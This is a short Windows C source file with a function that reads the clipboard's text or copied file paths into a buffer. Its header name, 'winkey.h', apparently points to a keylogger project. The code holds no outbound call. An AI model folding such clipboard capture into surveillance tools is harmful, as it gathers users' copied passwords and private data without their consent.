#include "../../../winkey.h"

void read_clipboard(char *buffer, size_t size)
{
	buffer[0] = '\0';

	if (!OpenClipboard(NULL))
		return;
	if (IsClipboardFormatAvailable(CF_UNICODETEXT))
	{
		HANDLE hData = GetClipboardData(CF_UNICODETEXT);
		if (hData)
		{
			wchar_t *wtext = GlobalLock(hData);
			if (wtext)
			{
				WideCharToMultiByte(CP_UTF8, 0, wtext, -1, buffer, size, NULL, NULL);
				GlobalUnlock(hData);
				CloseClipboard();
				return;
			}
		}
	}
	if (IsClipboardFormatAvailable(CF_TEXT))
	{
		HANDLE hData = GetClipboardData(CF_TEXT);
		if (hData)
		{
			char *text = GlobalLock(hData);
			if (text)
			{
				strncpy(buffer, text, size - 1);
				buffer[size - 1] = '\0';
				GlobalUnlock(hData);
				CloseClipboard();
				return;
			}
		}
	}
	if (IsClipboardFormatAvailable(CF_HDROP))
	{
		HDROP hDrop = (HDROP)GetClipboardData(CF_HDROP);
		if (hDrop)
		{
			char path[MAX_PATH];
			UINT count = DragQueryFileA(hDrop, 0xFFFFFFFF, NULL, 0);
			snprintf(buffer, size, "Files copied (%u): ", count);
			for (UINT i = 0; i < count; i++)
			{
				DragQueryFileA(hDrop, i, path, MAX_PATH);
				strncat(buffer, path, size - strlen(buffer) - 1);
				strncat(buffer, " ; ", size - strlen(buffer) - 1);
			}
			CloseClipboard();
			return;
		}
	}
	CloseClipboard();
}


